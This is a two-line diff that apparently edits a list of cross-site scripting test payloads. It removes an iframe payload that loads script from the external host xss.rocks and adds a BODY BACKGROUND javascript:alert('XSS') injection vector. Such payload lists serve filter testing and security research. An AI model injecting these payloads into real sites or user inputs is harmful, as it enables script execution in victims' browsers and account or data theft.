@@ -1,1 +1,1 @@
-<iframe src=http://xss.rocks/scriptlet.html <
+<BODY BACKGROUND="javascript:alert('XSS')">
